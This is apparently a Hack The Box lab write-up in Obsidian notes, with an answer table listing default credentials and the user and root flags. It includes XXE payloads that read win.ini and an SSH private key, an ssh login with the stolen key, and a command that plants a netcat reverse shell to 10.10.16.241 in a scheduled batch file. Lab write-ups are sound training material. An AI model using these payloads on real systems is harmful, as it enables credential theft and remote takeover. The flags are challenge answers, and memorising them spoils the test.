---
tags:
  - type/machine
  - platform/htb
  - status/solved
  - tech/web/default-creds
  - tech/exec/ssh-key
type: machine
platform: htb
domain: app.htb
status: solved
tech_count: 2
---

| Task                                                                      | Answer                           |
| ------------------------------------------------------------------------- | -------------------------------- |
| [[#What version of Apache is running on the target's port 80?]]           | 2.4.41                           |
| [[#What username password combination logs in successfully?]]             | admin:password                   |
| [[#What is the word at the top of the page that accepts user input?]]     | order                            |
| [[#What XML version is used on the target?]]                              | 1.0                              |
| [[#What does the XXE / XEE attack acronym stand for?]]                    | XML eXternal Entity              |
| [[#What username can we find on the webpage's HTML code?]]                | Daniel                           |
| [[#What is the file located in the Log-Management folder on the target?]] | job.bat                          |
| [[#What executable is mentioned in the file mentioned before?]]           | wevtutil.exe                     |
| Submit user Flag                                                          | 032d2fc8952a8c24e39c8f0ee9918ef7 |
| Submit root Flag                                                          | f574a3e7650cebd8c39784299cb570f8 |

## What version of Apache is running on the target's port 80?

![[Pasted image 20260121102702.png]]

## What username:password combination logs in successfully?

`admin:password`
![[Pasted image 20260121133847.png]]

## What is the word at the top of the page that accepts user input?

![[Pasted image 20260121133847.png]]



## What XML version is used on the target?

`1.0`
![[Pasted image 20260121134757.png]]
## What does the XXE / XEE attack acronym stand for?

`XML eXternal Entity`


## What username can we find on the webpage's HTML code?

`Daniel`
![[Pasted image 20260121140933.png]]





## What is the file located in the Log-Management folder on the target?



```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>
```
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/Daniel/.ssh/id_rsa'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>
```

id_rsa theft using XXE vulnerability attack
XXE 취약점 공격으로 id_rsa 탈취

![[Pasted image 20260121142212.png]]

```bash
vi id_rsa
# copy paste
ssh daniel@app.htb -i id_rsa
```

![[Pasted image 20260121143116.png]]


![[Pasted image 20260121143602.png]]


## What executable is mentioned in the file mentioned before?

![[Pasted image 20260121143602.png]]

## Privilege Escalation

```powershell
whoami /priv
```
![[Pasted image 20260121143323.png]]

```powershell
icacls job.bat
```
![[Pasted image 20260121144042.png]]

```powershell
Get-Process | Where-Object { $_.ProcessName -match "wevtutil" }
```
![[Pasted image 20260121144933.png]]

job.bat 내용 수정
```dos
C:\Log-Management\nc64.exe -e cmd.exe 10.10.16.241 4444 > C:\Log-Management\job.bat
```

![[Pasted image 20260121152246.png]]

Retrieve root.txt
![[Pasted image 20260121152526.png]]